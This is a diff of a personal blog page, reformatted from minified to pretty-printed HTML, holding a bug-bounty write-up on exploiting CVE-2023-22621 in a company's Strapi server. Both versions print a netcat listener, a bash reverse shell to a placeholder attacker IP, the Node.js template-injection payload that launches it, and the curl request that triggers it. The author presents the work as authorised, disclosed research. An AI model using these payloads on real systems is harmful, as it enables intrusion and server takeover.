@@ -1,15 +1,178 @@
-<!doctype html><html lang=en-us><head><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','G-59X131RVLB','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta property="og:image" content="https://tedmdelacruz.github.io/strapi-rce-thumbnail.jpg"><meta property="og:image:width" content="200"><meta property="og:image:height" content="200"><title>Remote code execution in a billion-dollar publicly traded company &#183; tedmdelacruz</title><link rel=stylesheet href=/css/style.css><link rel=stylesheet href=/css/fonts.css><link rel=stylesheet href=/styles.css><link rel=icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/images/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/images/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link href rel=alternate type=application/rss+xml title=tedmdelacruz><script src=/js/darkmode.js></script></head><body><nav class=nav><div class=nav-container><a href=/><h2 class=nav-title>tedmdelacruz</h2></a><ul></ul></div></nav><div id=darkModeToggle onclick=toggleDarkMode()>&#9680;</div><main><div class=post><div class=post-info><span>Written by</span>
-Ted Mathew dela Cruz<br><span>on&nbsp;</span><time datetime="2024-02-10 21:43:57 +0800 CST">February 10, 2024</time></div><h1 class=post-title>Remote code execution in a billion-dollar publicly traded company</h1><div class=post-line></div><p><img src=/strapi-rce-thumbnail.jpg alt=Thumbnail></p><p>There are 4 things that need to happen in order to find <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-22621>CVE-2023-22621</a> in the wild:</p><ul><li>You need to find a website that is powered by <a href=https://strapi.io>Strapi</a>.</li><li>The <em>super admin</em> for this website, <em>somehow</em>, <strong>has not been claimed yet</strong>.</li><li>The version of Strapi should be <em>at least</em> <strong>4.5.5 and below</strong>.</li><li>No other hacker had <em>somehow</em> seen any of the three aforementioned scenarios first.</li></ul><p>The stars have aligned in my favor, and with this <a href=https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures>CVE</a>, I managed to fully take over one of the websites of a <strong>billion-dollar company listed on the New York Stock Exchange</strong>.</p><p>And I happen to be invited to their private <a href=https://en.wikipedia.org/wiki/Bug_bounty_program>bug bounty program</a>.</p><h1 id=reconnaissance>Reconnaissance</h1><p>I have a server that pings me of new subdomains of this company every 5pm Manila time so I can check them out after work.</p><p>Usually I don&rsquo;t find anything in my probes, and this one: <strong>strapi.[redacted].com</strong> also didn&rsquo;t trigger any alarms at first.
-My automations pinged me about the subdomain of this website around early December 2023, but this website caught my attention during a manual inspection of the company assets that I did around early February 2024.</p><p>I couldn&rsquo;t believe it at first, but the <em>super admin</em> registration for this website was open. And <em>somehow</em>, no other hacker had seen this before me:</p><p><img src=/strapi-rce-admin.PNG alt="Admin Registration"></p><p>Realizing this was nothing short of exhilarating, since it’s been months since I got a paid bug bounty.</p><h1 id=escalation>Escalation</h1><p>Claiming the super admin of a website is nice and dandy, but like most other security researchers, I asked myself: &ldquo;How can I escalate this to something even more severe?".</p><p>The next step was obvious; I googled &lsquo;strapi cve&rsquo;. One particular CVE instantly caught my attention: <strong><a href=https://nvd.nist.gov/vuln/detail/CVE-2023-22621>CVE-2023-22621</a></strong> which allows for an authenicated user to execute the highly coveted <strong><a href=https://en.wikipedia.org/wiki/Arbitrary_code_execution><em>remote code execution</em></a>.</strong></p><p>The CVE ticks all of the boxes:</p><ul><li>You need to have super admin access (I got that) ✔</li><li>The version of Strapi should be 4.5.5 and below (This website is on Strapi v3.6.0) ✔</li></ul><h1 id=exploitation>Exploitation</h1><p>The CVE allows for a remote code execution via a <a href=https://wiki.ubuntu.com/ReverseShell>reverse shell</a>, which requires an attacker server waiting for incoming TCP connection from a victim server.</p><h2 id=preparing-the-attacker-server>Preparing the attacker server</h2><p>I whipped up a small Digital Ocean droplet and using <a href=https://en.wikipedia.org/wiki/Netcat>netcat</a> I had it listen to incoming TCP connections in port <code>1234</code>:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>$ nc -lvnp <span style=color:#ae81ff>1234</span>
-</code></pre></div><ul><li><code>-l</code> Instructs <code>netcat</code> to listen for incoming TCP connection rather than initiating a connection to a remote host.</li><li><code>-v</code> Produces more verbose output.</li><li><code>-n</code> Toggles <code>netcat</code> to not do any DNS or service lookups.</li><li><code>-p</code> Specifies the port to listen to.</li></ul><h2 id=executing-the-reverse-shell-payload>Executing the reverse shell payload</h2><p>The reverse shell payload that worked for me after initial tests in my local network was the following:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>bash -c <span style=color:#e6db74>&#39;bash -i &gt;&amp; /dev/tcp/[MY_ATTACKER_IP]/1234 0&gt;&amp;1&#39;</span>
-</code></pre></div><p>Combining this with the NodeJs exploit described in the CVE, we get the following payload:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#f92672>&lt;%=</span> <span style=color:#e6db74>`</span><span style=color:#e6db74>${</span> <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>binding</span>(<span style=color:#e6db74>&#34;spawn_sync&#34;</span>).<span style=color:#a6e22e>spawn</span>({<span style=color:#e6db74>&#34;file&#34;</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;/bin/bash&#34;</span>,<span style=color:#e6db74>&#34;args&#34;</span><span style=color:#f92672>:</span>[<span style=color:#e6db74>&#34;/bin/bash&#34;</span>,<span style=color:#e6db74>&#34;-c&#34;</span>,<span style=color:#e6db74>&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/[MY_ATTACKER_IP]/1234 0&gt;&amp;1&#39;&#34;</span>],<span style=color:#e6db74>&#34;stdio&#34;</span><span style=color:#f92672>:</span>[{<span style=color:#e6db74>&#34;readable&#34;</span><span style=color:#f92672>:</span><span style=color:#ae81ff>1</span>,<span style=color:#e6db74>&#34;writable&#34;</span><span style=color:#f92672>:</span><span style=color:#ae81ff>1</span>,<span style=color:#e6db74>&#34;type&#34;</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;pipe&#34;</span><span style=color:#e6db74>}</span><span style=color:#e6db74>,{&#34;readable&#34;:1,&#34;writable&#34;:1,&#34;type&#34;:&#34;pipe&#34;/*&lt;&gt;%=*/}]}).output }`</span> <span style=color:#f92672>%&gt;</span>
-</code></pre></div><p>Now, <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-22621>CVE-2023-22621</a> exploits an email template bypass in Strapi. Simply put, it runs when an attempt to send an email is sent. The initial configuration of Strapi allows admins to update the email confirmation template. This is where the payload is saved:</p><p><img src=/strapi-rce-payload.PNG alt="Strapi RCE payload"></p><h2 id=spawning-a-shell-as-root-in-the-compromised-server>Spawning a shell as <code>root</code> in the compromised server</h2><p>This exploit runs when a confirmation email is sent, so an API call that registers a new user to Strapi in order to execute the reverse shell is necessary. This is a basic cURL command for that purpose:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>$ curl -vvv -X POST -H <span style=color:#e6db74>&#39;Content-Type: application/json&#39;</span> -d <span style=color:#e6db74>&#39;{&#34;email&#34;:&#34;tedminfosec+rce1@gmail.com&#34;, &#34;username&#34;:&#34;rcetrigger1&#34;, &#34;password&#34;: &#34;Test1234!&#34;}&#39;</span> https://strapi.<span style=color:#f92672>[</span>redacted<span style=color:#f92672>]</span>.com/auth/local/register/
-</code></pre></div><p>Upon execution of the cURL command, Strapi attempts to validate the email template. The exploit then takes advantage of a template validation bypass and runs the reverse shell payload via <code>node</code>. The reverse shell then initiates a TCP connection to my attacker server, which spawns a <code>bash</code> session.</p><p>Now, the attacker machine has logged in to the server as <code>root</code>, <strong>giving me total control of the server</strong>:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>root@<span style=color:#f92672>[</span>redacted<span style=color:#f92672>]</span>:/home/<span style=color:#f92672>[</span>redacted<span style=color:#f92672>]</span>/project/strapi# ls
-ls
-api    config      favicon.ico   package.json  README.md
-build  extensions  node_modules  public        yarn.lock
-</code></pre></div><p>In order to prove the RCE, I left an inconspicuous text file in the server at <code>/root/tedminfosec.txt</code>:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>root@<span style=color:#f92672>[</span>redacted<span style=color:#f92672>]</span>:/home/<span style=color:#f92672>[</span>redacted<span style=color:#f92672>]</span>/project/strapi# cat /root/tedminfosec.txt
-hello from tedminfosec@wearehackerone.com
-</code></pre></div><h1 id=impact>Impact</h1><p>Without disclosing too much about the compromised server, it contains highly sensitive keys and secrets that could have allowed a malicious actor to pivot to other, more sensitive assets in the company&rsquo;s internal network.</p><p>The malicious actor could have done more than just defacing a website or use it to launch phishing campaigns.</p><p>Since privilege escalation at this point would break the <em>rules of engagement</em>, I decided to stop testing from there.</p><h1 id=responsible-disclosure>Responsible disclosure</h1><p>Once that&rsquo;s done, I took my time to write a detailed vulnerability report and submitted it to the bug bounty program. It was triaged as <strong>Critical</strong>:</p><p><img src=/strapi-rce-triage.jpg alt="Strapi RCE triage"></p><p>Now that&rsquo;s how I compromised a server of a company worth more than a billion dollars.</p></div><div class=pagination><a href=/posts/hello-world/ class="left arrow">&#8592;</a>
-<a href=/posts/whoami/ class="right arrow">&#8594;</a>
-<a href=# class=top>Top</a></div></main><footer><span>&copy; <time datetime="2025-02-19 17:24:15.350211168 +0800 CST m=+0.315940705">2025</time> . Made with <a href=https://gohugo.io>Hugo</a> using the <a href=https://github.com/EmielH/tale-hugo/>Tale</a> theme.</span></footer></body></html>
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+		
+		
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-59X131RVLB"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-59X131RVLB');
+        }
+      </script>
+		
+		<meta property="og:url" content="http://localhost:1313/posts/strapi-rce-writeup/">
+  <meta property="og:site_name" content="tedmdelacruz">
+  <meta property="og:title" content="Remote code execution in a billion-dollar publicly traded company">
+  <meta property="og:description" content="How I legally hacked a billion-dollar company with their permission - with the highest severity …">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-02-10T21:43:57+08:00">
+    <meta property="article:modified_time" content="2024-02-10T21:43:57+08:00">
+
+	
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+			<meta property="og:image" content="https://tedmdelacruz.github.io/strapi-rce-thumbnail.jpg" />
+			<meta property="og:image:width" content="200" />
+			<meta property="og:image:height" content="200" />
+
+		<title>Remote code execution in a billion-dollar publicly traded company &middot; tedmdelacruz</title>
+
+		
+		<link rel="stylesheet" href="/css/style.css">
+		<link rel="stylesheet" href="/css/fonts.css">
+		<link rel="stylesheet" href="/styles.css">
+		
+		<link rel="icon" href="/favicon.ico"/>
+		<link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+		<link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+		<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+		
+		<link href="" rel="alternate" type="application/rss+xml" title="tedmdelacruz" />
+
+		<script src="/js/darkmode.js"></script>
+	</head>
+
+    <body>
+        		<nav class="nav">
+			<div class="nav-container">
+				<a href="/">
+					
+						<h2 class="nav-title">tedmdelacruz</h2>
+					
+				</a>
+				<ul>
+    
+    
+</ul>
+			</div>
+		</nav>
+
+        <div id="darkModeToggle" onclick="toggleDarkMode()">
+  &#9680; 
+</div>
+
+        
+
+<main>
+	
+
+
+        <div class="post">
+		<div class="post-info">
+    <span>Written by</span>
+        Ted Mathew dela Cruz
+        <br>
+        <span>on&nbsp;</span><time datetime="2024-02-10 21:43:57 &#43;0800 CST">February 10, 2024</time>
+</div>
+
+		<h1 class="post-title">Remote code execution in a billion-dollar publicly traded company</h1>
+<div class="post-line"></div>
+
+		
+
+		<p><img src="/strapi-rce-thumbnail.jpg" alt="Thumbnail"></p>
+<p>There are 4 things that need to happen in order to find <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-22621">CVE-2023-22621</a> in the wild:</p>
+<ul>
+<li>You need to find a website that is powered by <a href="https://strapi.io">Strapi</a>.</li>
+<li>The <em>super admin</em> for this website, <em>somehow</em>, <strong>has not been claimed yet</strong>.</li>
+<li>The version of Strapi should be <em>at least</em> <strong>4.5.5 and below</strong>.</li>
+<li>No other hacker had <em>somehow</em> seen any of the three aforementioned scenarios first.</li>
+</ul>
+<p>The stars have aligned in my favor, and with this <a href="https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures">CVE</a>, I managed to fully take over one of the websites of a <strong>billion-dollar company listed on the New York Stock Exchange</strong>.</p>
+<p>And I happen to be invited to their private <a href="https://en.wikipedia.org/wiki/Bug_bounty_program">bug bounty program</a>.</p>
+<h1 id="reconnaissance">Reconnaissance</h1>
+<p>I have a server that pings me of new subdomains of this company every 5pm Manila time so I can check them out after work.</p>
+<p>Usually I don&rsquo;t find anything in my probes, and this one: <strong>strapi.[redacted].com</strong> also didn&rsquo;t trigger any alarms at first.
+My automations pinged me about the subdomain of this website around early December 2023, but this website caught my attention during a manual inspection of the company assets that I did around early February 2024.</p>
+<p>I couldn&rsquo;t believe it at first, but the <em>super admin</em> registration for this website was open. And <em>somehow</em>, no other hacker had seen this before me:</p>
+<p><img src="/strapi-rce-admin.PNG" alt="Admin Registration"></p>
+<p>Realizing this was nothing short of exhilarating, since it’s been months since I got a paid bug bounty.</p>
+<h1 id="escalation">Escalation</h1>
+<p>Claiming the super admin of a website is nice and dandy, but like most other security researchers, I asked myself: &ldquo;How can I escalate this to something even more severe?&rdquo;.</p>
+<p>The next step was obvious; I googled &lsquo;strapi cve&rsquo;. One particular CVE instantly caught my attention: <strong><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-22621">CVE-2023-22621</a></strong> which allows for an authenicated user to execute the highly coveted <strong><a href="https://en.wikipedia.org/wiki/Arbitrary_code_execution"><em>remote code execution</em></a>.</strong></p>
+<p>The CVE ticks all of the boxes:</p>
+<ul>
+<li>You need to have super admin access (I got that) ✔</li>
+<li>The version of Strapi should be 4.5.5 and below (This website is on Strapi v3.6.0) ✔</li>
+</ul>
+<h1 id="exploitation">Exploitation</h1>
+<p>The CVE allows for a remote code execution via a <a href="https://wiki.ubuntu.com/ReverseShell">reverse shell</a>, which requires an attacker server waiting for incoming TCP connection from a victim server.</p>
+<h2 id="preparing-the-attacker-server">Preparing the attacker server</h2>
+<p>I whipped up a small Digital Ocean droplet and using <a href="https://en.wikipedia.org/wiki/Netcat">netcat</a> I had it listen to incoming TCP connections in port <code>1234</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ nc -lvnp <span style="color:#ae81ff">1234</span>
+</span></span></code></pre></div><ul>
+<li><code>-l</code> Instructs <code>netcat</code> to listen for incoming TCP connection rather than initiating a connection to a remote host.</li>
+<li><code>-v</code> Produces more verbose output.</li>
+<li><code>-n</code> Toggles <code>netcat</code> to not do any DNS or service lookups.</li>
+<li><code>-p</code> Specifies the port to listen to.</li>
+</ul>
+<h2 id="executing-the-reverse-shell-payload">Executing the reverse shell payload</h2>
+<p>The reverse shell payload that worked for me after initial tests in my local network was the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/[MY_ATTACKER_IP]/1234 0&gt;&amp;1&#39;</span>
+</span></span></code></pre></div><p>Combining this with the NodeJs exploit described in the CVE, we get the following payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;%=</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">binding</span>(<span style="color:#e6db74">&#34;spawn_sync&#34;</span>).<span style="color:#a6e22e">spawn</span>({<span style="color:#e6db74">&#34;file&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span>,<span style="color:#e6db74">&#34;args&#34;</span><span style="color:#f92672">:</span>[<span style="color:#e6db74">&#34;/bin/bash&#34;</span>,<span style="color:#e6db74">&#34;-c&#34;</span>,<span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/[MY_ATTACKER_IP]/1234 0&gt;&amp;1&#39;&#34;</span>],<span style="color:#e6db74">&#34;stdio&#34;</span><span style="color:#f92672">:</span>[{<span style="color:#e6db74">&#34;readable&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;writable&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;type&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;pipe&#34;</span><span style="color:#e6db74">}</span><span style="color:#e6db74">,{&#34;readable&#34;:1,&#34;writable&#34;:1,&#34;type&#34;:&#34;pipe&#34;/*&lt;&gt;%=*/}]}).output }`</span> <span style="color:#f92672">%&gt;</span>
+</span></span></code></pre></div><p>Now, <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-22621">CVE-2023-22621</a> exploits an email template bypass in Strapi. Simply put, it runs when an attempt to send an email is sent. The initial configuration of Strapi allows admins to update the email confirmation template. This is where the payload is saved:</p>
+<p><img src="/strapi-rce-payload.PNG" alt="Strapi RCE payload"></p>
+<h2 id="spawning-a-shell-as-root-in-the-compromised-server">Spawning a shell as <code>root</code> in the compromised server</h2>
+<p>This exploit runs when a confirmation email is sent, so an API call that registers a new user to Strapi in order to execute the reverse shell is necessary. This is a basic cURL command for that purpose:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ curl -vvv -X POST -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> -d <span style="color:#e6db74">&#39;{&#34;email&#34;:&#34;tedminfosec+rce1@gmail.com&#34;, &#34;username&#34;:&#34;rcetrigger1&#34;, &#34;password&#34;: &#34;Test1234!&#34;}&#39;</span> https://strapi.<span style="color:#f92672">[</span>redacted<span style="color:#f92672">]</span>.com/auth/local/register/
+</span></span></code></pre></div><p>Upon execution of the cURL command, Strapi attempts to validate the email template. The exploit then takes advantage of a template validation bypass and runs the reverse shell payload via <code>node</code>. The reverse shell then initiates a TCP connection to my attacker server, which spawns a <code>bash</code> session.</p>
+<p>Now, the attacker machine has logged in to the server as <code>root</code>, <strong>giving me total control of the server</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>root@<span style="color:#f92672">[</span>redacted<span style="color:#f92672">]</span>:/home/<span style="color:#f92672">[</span>redacted<span style="color:#f92672">]</span>/project/strapi# ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>api    config      favicon.ico   package.json  README.md
+</span></span><span style="display:flex;"><span>build  extensions  node_modules  public        yarn.lock
+</span></span></code></pre></div><p>In order to prove the RCE, I left an inconspicuous text file in the server at <code>/root/tedminfosec.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>root@<span style="color:#f92672">[</span>redacted<span style="color:#f92672">]</span>:/home/<span style="color:#f92672">[</span>redacted<span style="color:#f92672">]</span>/project/strapi# cat /root/tedminfosec.txt
+</span></span><span style="display:flex;"><span>hello from tedminfosec@wearehackerone.com
+</span></span></code></pre></div><h1 id="impact">Impact</h1>
+<p>Without disclosing too much about the compromised server, it contains highly sensitive keys and secrets that could have allowed a malicious actor to pivot to other, more sensitive assets in the company&rsquo;s internal network.</p>
+<p>The malicious actor could have done more than just defacing a website or use it to launch phishing campaigns.</p>
+<p>Since privilege escalation at this point would break the <em>rules of engagement</em>, I decided to stop testing from there.</p>
+<h1 id="responsible-disclosure">Responsible disclosure</h1>
+<p>Once that&rsquo;s done, I took my time to write a detailed vulnerability report and submitted it to the bug bounty program. It was triaged as <strong>Critical</strong>:</p>
+<p><img src="/strapi-rce-triage.jpg" alt="Strapi RCE triage"></p>
+<p>Now that&rsquo;s how I compromised a server of a company worth more than a billion dollars.</p>
+
+
+		
+	</div>
+
+	<div class="pagination">
+		<a href="/posts/whoami/" class="left arrow">&#8592;</a>
+
+		<a href="#" class="top">Top</a>
+	</div>
+</main>
+
+
+        		<footer>
+			
+			<span>
+			&copy; <time datetime="2025-02-19 18:29:38.965895829 &#43;0800 CST m=&#43;1409.205700186">2025</time> Ted Mathew dela Cruz
+			</span>
+		</footer>
+
+    </body>
+</html>
